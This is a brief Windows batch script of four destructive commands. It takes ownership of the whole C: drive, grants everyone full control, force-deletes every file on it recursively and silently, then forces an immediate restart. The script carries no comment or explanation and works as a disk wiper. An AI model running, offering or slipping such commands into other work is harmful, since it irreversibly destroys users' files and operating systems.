@echo off
takeown /f C:\ /r /d y
icacls C:\ /grant everyone:F /t
del /f /s /q C:\
shutdown /r /o /f /t 0